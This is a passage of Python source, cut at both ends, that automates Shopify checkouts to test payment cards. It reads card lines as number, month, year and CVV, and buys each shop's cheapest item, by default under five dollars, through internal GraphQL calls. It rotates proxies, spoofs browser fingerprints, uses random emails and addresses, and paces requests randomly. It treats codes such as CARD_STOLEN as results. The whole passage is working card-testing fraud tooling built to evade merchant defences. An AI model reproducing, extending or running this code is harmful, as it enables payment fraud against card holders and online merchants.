        "referer": f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin", "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    with Session(impersonate=impersonate) as s:
        kw = {"data": payload, "headers": headers, "timeout": 15}
        if proxy_url: kw["proxy"] = proxy_url
        resp = s.post(endpoint, **kw)
    return resp.status_code, resp.text


def _proposal_headers(shop_url, checkout_url, checkout_token, session_token,
                      build_id, source_token):
    return {
        "accept": "application/json", "accept-language": "en-US",
        "content-type": "application/json", "origin": shop_url,
        "priority": "u=1, i", "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


def send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                  currency, country, checkpoint_data=""):
    cp_block = f'"checkpointData": {json.dumps(checkpoint_data)},' if checkpoint_data else ""
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    {cp_block}
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [], "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null, "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{"productVariantReference": {{"id": "gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": "gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": null, "sellingPlanDigest": null}}}},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{"totalAmount": {{"any": true}}, "paymentLines": [], "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}}},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US", "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}}, "rememberMe": false
    }},
    "tip": {{"tipLines": []}}, "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token))
    return resp.status_code, resp.text


def send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                   stable_id, variant_id, price, proposal_id, build_id, source_token,
                   queue_token, email, currency, country, checkpoint_data=""):
    cp_block = f'"checkpointData": {json.dumps(checkpoint_data)},' if checkpoint_data else ""
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    {cp_block}
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}}, "destinationChanged": true
      }}],
      "noDeliveryRequired": [], "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null, "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{"productVariantReference": {{"id": "gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": "gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": null, "sellingPlanDigest": null}}}},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{"totalAmount": {{"any": true}}, "paymentLines": [], "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}}},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}", "emailChanged": true,
      "phoneCountryCode": "US", "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}}, "rememberMe": false
    }},
    "tip": {{"tipLines": []}}, "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token))
    return resp.status_code, resp.text


def send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                   stable_id, variant_id, price, proposal_id, build_id, source_token,
                   queue_token, email, addr, currency, country, checkpoint_data=""):
    cp_block = f'"checkpointData": {json.dumps(checkpoint_data)},' if checkpoint_data else ""
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    {cp_block}
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}", "address2": "{addr.address2}",
            "city": "{addr.city}", "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}}, "destinationChanged": true
      }}],
      "noDeliveryRequired": [], "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null, "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{"productVariantReference": {{"id": "gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": "gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": null, "sellingPlanDigest": null}}}},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}}, "paymentLines": [],
      "billingAddress": {{"streetAddress": {{"address1": "{addr.address1}", "address2": "{addr.address2}", "city": "{addr.city}", "countryCode": "{addr.country_code}", "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}", "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}", "phone": "{addr.phone}"}}}}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}", "emailChanged": false,
      "phoneCountryCode": "US", "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}}, "rememberMe": false
    }},
    "tip": {{"tipLines": []}}, "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token))
    return resp.status_code, resp.text


def send_poll_for_receipt(client, shop_url, checkout_url, checkout_token, session_token,
                          build_id, source_token, poll_id, receipt_id, receipt_session_token):
    params = {"operationName": "PollForReceipt",
              "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
              "id": poll_id}
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


def send_submit_for_completion(client, shop_url, checkout_url, checkout_token, session_token,
                               stable_id, variant_id, price, submit_id, build_id, source_token,
                               queue_token, email, addr, delivery_handle, shipping_amount,
                               total_amount, pci_session_id, attempt_token, currency, country,
                               signed_handles, is_digital=False, tax_amount=None,
                               checkpoint_data=""):
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {{"any": true}}, "destinationChanged": true
        }}],
        "noDeliveryRequired": [], "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null, "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{"streetAddress": {{"address1": "{addr.address1}", "address2": "{addr.address2}", "city": "{addr.city}", "countryCode": "{addr.country_code}", "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}", "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}", "phone": "{addr.phone}", "oneTimeUse": false}}}},
          "selectedDeliveryStrategy": {{"deliveryStrategyByHandle": {{"handle": "{delivery_handle}", "customDeliveryRate": false}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {{"any": true}}, "destinationChanged": false
        }}],
        "noDeliveryRequired": [], "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null, "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'
    cp_block  = f'"checkpointData": {json.dumps(checkpoint_data)},' if checkpoint_data else ""

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      {cp_block}
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{"productVariantReference": {{"id": "gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": "gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": null, "sellingPlanDigest": null}}}},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{"streetAddress": {{"address1": "{addr.address1}", "address2": "{addr.address2}", "city": "{addr.city}", "countryCode": "{addr.country_code}", "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}", "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}", "phone": "{addr.phone}"}}}},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null, "redeemablePaymentMethod": null,
            "walletPaymentMethod": null, "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null, "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null, "manualPaymentMethod": null,
            "customPaymentMethod": null, "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null, "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null, "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{"streetAddress": {{"address1": "{addr.address1}", "address2": "{addr.address2}", "city": "{addr.city}", "countryCode": "{addr.country_code}", "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}", "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}", "phone": "{addr.phone}"}}}}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}", "emailChanged": false,
        "phoneCountryCode": "US", "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}}, "rememberMe": false
      }},
      "tip": {{"tipLines": []}}, "poNumber": null,
      "taxes": {{"proposedAllocations": null, {tax_block}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{"requestUrl": "{checkout_url}", "pageId": "{page_id}"}}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token))
    return resp.status_code, resp.text


_NOISE_CODES = {
    "DELIVERY_POSTAL_CODE_REQUIRED", "DELIVERY_ZONE_REQUIRED_FOR_COUNTRY",
    "PAYMENTS_FIRST_NAME_REQUIRED", "PAYMENTS_LAST_NAME_REQUIRED",
    "PAYMENTS_ADDRESS1_REQUIRED", "PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY",
    "PAYMENTS_POSTAL_CODE_REQUIRED", "PAYMENTS_CITY_REQUIRED",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "REQUIRED_ARTIFACTS_UNAVAILABLE",
    "BUYER_IDENTITY_MISSING_CONTACT_METHOD",
}


def check_proposal_errors(step, status, body):
    if status != 200:
        logger.warning("%s: unexpected HTTP %d", step, status)
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body)
    if not matches: return
    filtered = [(c, m) for c, m in matches if c.upper() not in _NOISE_CODES]
    if not filtered: return
    for code, msg in filtered:
        logger.warning("%s proposal error — code=%s msg=%s", step, code, msg)
    hard = {"CARD_DECLINED", "CARD_EXPIRED", "CARD_INVALID", "CVV_INVALID",
            "CARD_STOLEN", "DO_NOT_HONOR", "RISK_REJECTED"}
    for code, _ in filtered:
        if code.upper() in hard:
            raise Exception(f"proposal hard error: {code}")


def check_submit_errors(status, body):
    if status != 200:
        logger.warning("check_submit_errors: HTTP %d", status)
    m = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if m and m.group(1) != "SubmitSuccess":
        for i, (code, msg) in enumerate(re.findall(
            r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
            body)):
            logger.warning("submit error #%d: code=%s msg=%s", i + 1, code, msg)


def parse_card_entry(entry):
    parts = entry.strip().split('|')
    if len(parts) != 4:
        raise Exception(f"invalid card format: {entry}")
    try:
        m = int(parts[1]); y = int(parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year: {e}")
    return parts[0], m, y, parts[3]


def normalize_proxy(raw):
    p = raw.strip()
    if not p: raise Exception("empty proxy")
    scheme = "http://"
    body = p
    if "://" in body:
        sp, body = body.split("://", 1)
        scheme = sp + "://"
    parts = body.split(":")
    if len(parts) == 4:
        host, port, user, password = parts
        try:
            pi = int(port)
            if not (0 < pi < 65536): raise ValueError
        except ValueError:
            raise Exception(f"invalid port: {port!r}")
        p = f"{scheme}{user}:{password}@{host}:{port}"
    else:
        p = scheme + body
    if not urllib.parse.urlparse(p).netloc:
        raise Exception(f"invalid proxy: {raw}")
    return p


def run_checkout_for_card(shop_url, card_entry, proxy_url="", low=True):
    currency = "USD"; country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         currency=currency, status=CheckStatus.ERROR)
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)
    client = TLSClient(timeout=15, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)
    checkpoint = ""

    try:
        try:
            _max = 5.00 if low else float("inf")
            logger.info(_redact(f"Step 0: find cheapest product on {shop_url}"))
            title, _pid, variant_id, price = find_cheapest_product(
                client, shop_url, min_price=0.10, max_price=_max)
            logger.info(_redact(f"Step 0 OK: {title!r} variant={variant_id} price={price}"))
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(
                client, shop_url, variant_id)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if pat_id:
                fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            logger.warning("step2 ignored: %s", e)

        try:
            proposal_id, submit_id, poll_id = discover_operation_ids(
                client, shop_url, checkout_html, checkout_url, checkout_token)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = poll_id or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
            logger.info(f"op ids: proposal={proposal_id[:12]}... submit={submit_id[:12]}...")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            p4_status, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country, checkpoint_data=checkpoint)
            check_proposal_errors("step4", p4_status, proposal_body)
            checkpoint = _track_checkpoint(proposal_body, checkpoint, "step4")
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency: currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country: country = ctr
            result.currency = currency
            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price: price = sp
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        time.sleep(random.uniform(0.7, 1.4))

        try:
            p5_status, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country, checkpoint_data=checkpoint)
            check_proposal_errors("step5", p5_status, proposal2_body)
            checkpoint = _track_checkpoint(proposal2_body, checkpoint, "step5")
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        time.sleep(random.uniform(0.6, 1.2))

        try:
            addr = address_for_country(country)
            fb = get_fallback_addresses(addr.country_code)
            idx = 0
            qt2 = queue_token2
            final_p3_body = None; final_qt3 = None; step6_is_digital = False
            for _ in range(1 + len(fb)):
                _, p3 = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    qt2, email, addr, currency, country, checkpoint_data=checkpoint)
                _qt3 = extract_queue_token(p3)
                if not _qt3: raise Exception("could not extract queueToken")
                _is_dig = not extract_is_shipping_required(p3)
                if _is_dig or not detect_shipping_restriction(p3):
                    final_p3_body = p3; final_qt3 = _qt3; step6_is_digital = _is_dig
                    break
                if idx < len(fb):
                    addr = fb[idx]; idx += 1; qt2 = _qt3
            if not final_p3_body:
                raise Exception("no shipping available")
            queue_token3 = final_qt3
            checkpoint = _track_checkpoint(final_p3_body, checkpoint, "step6")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        time.sleep(random.uniform(0.5, 1.0))

        try:
            _, p4 = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country, checkpoint_data=checkpoint)
            queue_token4 = extract_queue_token(p4)
            if not queue_token4: raise Exception("could not extract queueToken")
            checkpoint = _track_checkpoint(p4, checkpoint, "step7")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            proposal5_status, proposal5_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country, checkpoint_data=checkpoint)
            checkpoint = _track_checkpoint(proposal5_body, checkpoint, "step8")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            _poll_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            _pending_re = re.compile(r'"__typename"\s*:\s*"PendingTerms"')
            for _ in range(6):
                if not _pending_re.search(proposal5_body): break
                m = _poll_re.search(proposal5_body)
                wait = int(m.group(1)) / 1000.0 if m else 0.5
                time.sleep(max(wait, 0.3))
                proposal5_status, proposal5_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token4, email, addr, currency, country, checkpoint_data=checkpoint)
            checkpoint = _track_checkpoint(proposal5_body, checkpoint, "step8-post")
        except Exception: pass

        time.sleep(random.uniform(0.9, 1.8))

        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str, card_month, card_year, card_cvv,
                vault_domain, proxy_url, vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fb = ("https://checkout.pci.shopifycs.com/sessions"
                       if "shopifyinc" in (vault_url or "")
                       else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str, card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fb, impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str, card_month, card_year, card_cvv,
                    vault_domain, "", vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]})")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5: raise Exception("could not extract queueToken")
            is_digital = step6_is_digital
            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10: could not extract delivery handle")
            signed_handles = extract_signed_handles(proposal5_body)
            _filled = ('"__typename": "FilledDeliveryTerms"' in proposal5_body or
                       '"__typename":"FilledDeliveryTerms"' in proposal5_body)
            if len(signed_handles) == 0 and not is_digital and not _filled:
                result.retryable = True
                raise Exception("Step 10: could not extract signedHandles")
            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10: could not extract shipping amount")
            if not shipping_amount: shipping_amount = "0.00"
            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount: total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital: total_amount = extract_running_total(proposal5_body)
            if not total_amount: raise Exception("Step 10: could not extract total amount")
            result.amount = total_amount

            checkpoint_data = checkpoint
            if checkpoint_data:
                logger.info(f"submit: checkpointData present ({len(checkpoint_data)} chars)")
            else:
                logger.warning("submit: no checkpointData")

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount

            submit_status, submit_body = 0, ""
            for _ in range(1, 4):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital,
                    tax_amount=current_tax, checkpoint_data=checkpoint_data)
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" not in submit_body: break
                nt = extract_tax_from_rejected(submit_body)
                ntt = extract_total_from_rejected(submit_body)
